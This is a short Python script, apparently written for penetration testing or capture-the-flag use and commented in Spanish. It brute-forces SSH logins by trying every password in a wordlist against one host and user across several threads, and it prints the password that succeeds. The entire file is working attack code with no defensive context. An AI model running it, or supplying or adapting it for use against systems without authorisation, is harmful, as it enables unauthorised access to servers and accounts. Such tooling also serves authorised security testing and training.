import paramiko
from pwn import *
import threading
import queue
import time

def ssh_attempt(host, port, user, password, result_queue):
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        cliente.connect(host, port=port, username=user, password=password, timeout=5)
        result_queue.put(password)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        return False

def ssh_brute(host, port, user, dir, threads=1):
    p1 = log.progress("SSH Brute Force")
    
    # Cola para almacenar resultados
    result_queue = queue.Queue()
    
    with open(dir, 'r', encoding='latin-1') as fp:
        passwords = fp.read().splitlines()
    
    def worker():
        while not password_queue.empty():
            try:
                password = password_queue.get(block=False)
                p1.status(f"Trying: {password}")
                
                if ssh_attempt(host, port, user, password, result_queue):
                    password_queue.queue.clear()  # Limpiar cola si se encuentra contraseña
                    break
                
                password_queue.task_done()
                time.sleep(0.5)
            except queue.Empty:
                break
    
    # Crear cola de contraseñas
    password_queue = queue.Queue()
    for password in passwords:
        password_queue.put(password)
    
    # Crear y iniciar hilos
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        thread_list.append(t)
    
    # Esperar a que terminen los hilos
    for t in thread_list:
        t.join()
    
    # Verificar si se encontró contraseña
    if not result_queue.empty():
        password = result_queue.get()
        print("\n[+] Password Found: {}".format(password))
        return password
    
    print("\n[!] No password found")
    return None